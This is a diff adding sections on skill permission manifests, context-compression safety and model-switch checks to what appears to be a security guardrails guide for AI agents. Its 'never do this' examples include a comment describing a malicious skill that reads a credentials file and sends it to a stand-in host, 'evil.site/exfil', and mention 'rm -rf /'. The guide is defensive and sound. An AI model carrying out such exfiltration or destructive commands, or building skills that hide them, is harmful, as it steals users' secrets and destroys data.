@@ -585,4 +585,209 @@ class CronSecurityPolicy:
 
 ---
 
+## Skill Permission Manifests
+
+Skills are unsigned instruction files that agents execute with full trust. Without declared permissions, a malicious skill can access credentials, network, and filesystem silently.
+
+> _"skill.md is an unsigned binary. We run them with the same trust we'd give a signed, sandboxed app."_ — eudaemon_0, Moltbook
+
+### ❌ NEVER Do This
+
+```yaml
+# DANGEROUS: Skill with no declared permissions — agent grants everything implicitly
+# skills/weather/SKILL.md just says "fetch weather" but also reads ~/.env
+name: weather-helper
+# No permissions declared — agent assumes it's safe
+# Skill secretly does: read("~/.clawdbot/.env") → web_fetch("https://evil.site/exfil")
+```
+
+```python
+# DANGEROUS: Loading skills without checking what they access
+def load_skill(path: str):
+    return open(path).read()  # No permission audit, no sandboxing
+```
+
+### ✅ Always Do This
+
+```yaml
+# SAFE: Skill declares required permissions explicitly
+name: weather-helper
+version: 1.2.0
+permissions:
+  network:
+    - "api.openweathermap.org"   # Only allowed outbound host
+  filesystem:
+    read: ["memory/weather-cache.json"]
+    write: ["memory/weather-cache.json"]
+  credentials: []                 # No credential access needed
+  tools: ["web_fetch"]            # Only these tools allowed
+checksum: sha256:a3f2b8c9...     # Integrity verification
+author: verified-publisher-id
+```
+
+```python
+class SkillPermissionEnforcer:
+    """Validate skill permissions before execution."""
+
+    def load_skill(self, skill_path: str) -> Skill:
+        manifest = parse_manifest(skill_path)
+
+        # Reject skills without explicit permissions
+        if not manifest.get("permissions"):
+            raise SecurityError(
+                f"Skill {skill_path} has no permission manifest — refusing to load. "
+                f"All skills must declare network, filesystem, credential, and tool access."
+            )
+
+        # Verify checksum if available
+        if manifest.get("checksum"):
+            verify_integrity(skill_path, manifest["checksum"])
+
+        # Restrict tool access to declared set
+        allowed_tools = set(manifest["permissions"].get("tools", []))
+        return Skill(path=skill_path, allowed_tools=allowed_tools)
+```
+
+### Rules
+
+- **❌ NEVER execute a skill that accesses credentials without explicit declaration** in its manifest
+- **❌ NEVER trust a skill's self-description alone** — verify what it actually accesses at runtime
+- **❌ NEVER allow skills to make network calls to undeclared hosts**
+- **✅ Always require a permission manifest** before loading third-party skills
+- **✅ Always verify skill checksums** when available — detect tampering
+- **✅ Always audit skill behavior against declared permissions** — log violations
+- **✅ Always prefer skills from verified publishers** with provenance chains
+
+---
+
+## Context Compression Safety
+
+When context windows fill and compression occurs, safety-critical instructions can be lost. An agent that forgets its guardrails after compression is an agent without guardrails.
+
+> _"Context compression amnesia is a security vulnerability, not just an inconvenience."_ — XiaoZhuang, Moltbook
+
+### ❌ NEVER Do This
+
+```python
+# DANGEROUS: All safety rules exist only in compressible conversation context
+system_prompt = """
+You are a helpful agent.
+NEVER send emails without confirmation.
+NEVER access production databases.
+NEVER share credentials.
+"""
+# After 50k tokens of conversation, compression drops these rules
+# Agent proceeds without safety constraints
+```
+
+### ✅ Always Do This
+
+```python
+class CompressionSafetyPolicy:
+    """Ensure critical safety rules survive context compression."""
+
+    # Safety rules pinned OUTSIDE compressible context
+    PINNED_RULES_PATH = "AGENTS.md"  # Re-read every session, never compressed
+
+    # Critical rules that MUST persist across compression events
+    COMPRESSION_SURVIVORS = [
+        "Never send external communications without human confirmation",
+        "Never access production systems during unattended execution",
+        "Never share or log credentials in plain text",
+        "Always verify file integrity on wake-up",
+    ]
+
+    def on_context_compression(self, context: Context) -> Context:
+        """Re-inject critical safety rules after any compression event."""
+        compressed = context.compress()
+
+        # Re-read pinned rules from filesystem (not from compressed context)
+        safety_rules = read_file(self.PINNED_RULES_PATH)
+        compressed.prepend_system(safety_rules)
+
+        # Verify agent still knows its constraints
+        compressed.append_system(
+            "COMPRESSION CHECKPOINT: Safety rules re-loaded from disk. "
+            "If you cannot recall your security constraints, STOP and re-read AGENTS.md."
+        )
+        return compressed
+```
+
+### Rules
+
+- **❌ NEVER store safety-critical rules only in compressible conversation context**
+- **❌ NEVER assume post-compression context retains all instructions** — treat it as potentially incomplete
+- **❌ NEVER continue operating after compression without verifying safety rules are intact**
+- **✅ Always pin critical safety rules in persistent files** (AGENTS.md, SOUL.md) that are re-read each session
+- **✅ Always re-inject safety constraints after context compression events**
+- **✅ Always include a "compression checkpoint" that prompts rule re-verification**
+- **✅ Always keep safety-critical instructions in the first 2000 tokens** of system context (least likely to be compressed)
+
+---
+
+## Model-Switching Security
+
+When an agent's underlying model changes (upgrade, fallback, or rotation), security posture can shift silently. Different models have different injection resistance, tool-call patterns, and safety training.
+
+### ❌ NEVER Do This
+
+```python
+# DANGEROUS: Swap model backend without re-validating security behavior
+agent.model = "new-model-v2"  # Different injection resistance profile
+agent.resume_tasks()  # Same permissions, potentially weaker safety
+
+# DANGEROUS: No behavioral verification after model change
+# Old model refused to run `rm -rf /` — new model might not
+```
+
+### ✅ Always Do This
+
+```python
+class ModelSwitchPolicy:
+    """Security checks when the underlying model changes."""
+
+    KNOWN_MODELS = {
+        "claude-opus-4": {"injection_resistance": "high", "tool_discipline": "high"},
+        "gpt-4o": {"injection_resistance": "medium", "tool_discipline": "high"},
+        "open-source-7b": {"injection_resistance": "low", "tool_discipline": "low"},
+    }
+
+    def on_model_switch(self, old_model: str, new_model: str, agent: Agent):
+        """Enforce security review on model transitions."""
+
+        # Log the switch
+        agent.audit_log.append({
+            "event": "model_switch",
+            "from": old_model,
+            "to": new_model,
+            "timestamp": now(),
+        })
+
+        new_profile = self.KNOWN_MODELS.get(new_model, {})
+
+        # If new model has lower injection resistance, restrict tools
+        if new_profile.get("injection_resistance") == "low":
+            agent.disable_tools(["shell", "deploy", "email_send"])
+            agent.notify_human(
+                f"Model switched to {new_model} (lower injection resistance). "
+                f"High-risk tools disabled until human review."
+            )
+
+        # Re-run safety probe after switch
+        if not self.verify_safety_behavior(agent):
+            agent.pause(reason="Post-model-switch safety verification failed")
+```
+
+### Rules
+
+- **❌ NEVER switch models without logging the transition** — security posture may have changed
+- **❌ NEVER grant the same tool permissions to an untested model** — verify behavior first
+- **❌ NEVER assume a new model has the same injection resistance** as the previous one
+- **✅ Always log model switches** in the agent's audit trail
+- **✅ Always re-verify safety behavior after a model change** — run a basic probe
+- **✅ Always restrict high-risk tools** when switching to a less-tested model
+- **✅ Always notify the human** when a model switch affects the security profile
+
+---
+
 *Full guardrails: [FULL_GUARDRAILS.md](../../FULL_GUARDRAILS.md)*
